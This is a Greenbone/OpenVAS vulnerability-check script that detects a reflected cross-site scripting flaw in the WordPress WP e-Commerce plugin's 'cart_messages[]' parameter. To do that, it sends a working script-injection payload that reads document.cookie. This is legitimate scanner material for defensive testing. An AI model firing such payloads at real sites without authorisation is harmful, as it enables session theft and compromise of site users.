CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802321" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2011-08-12 14:44:50 +0200 (Fri, 12 Aug 2011)" );
	script_bugtraq_id( 49009 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_name( "WordPress WP e-Commerce Plugin 'cart_messages' Parameter Cross-site Scripting Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wordpress/installed" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/45513/" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/519149" );
	script_xref( name: "URL", value: "http://www.htbridge.ch/advisory/xss_in_wp_e_commerce.html" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/103724/wpecommerce-xss.txt" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to insert arbitrary
  HTML and script code, which will be executed in a user's browser session in the
  context of an affected site when the malicious data is being viewed." );
	script_tag( name: "affected", value: "WordPress WP e-Commerce Plugin version 3.8.6 and prior." );
	script_tag( name: "insight", value: "The flaw is due to improper validation of user-supplied input
  passed via the 'cart_messages[]' parameter to '/wp-content/plugins/wp-e-commerce
  /wpsc-theme/wpsc-cart_widget.php', which allows attacker to execute
  arbitrary HTML and script code on the user's browser session in the security
  context of an affected site." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is installed with WordPress WP e-Commerce plugin and
  is prone to cross-site scripting vulnerability." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/wp-content/plugins/wp-e-commerce/wpsc-theme/wpsc-cart_widget.php?cart_messages[]=<script>alert(document.cookie);</script>";
if(http_vuln_check( port: port, url: url, pattern: "<script>alert\\(document\\.cookie\\);</script>", check_header: TRUE )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

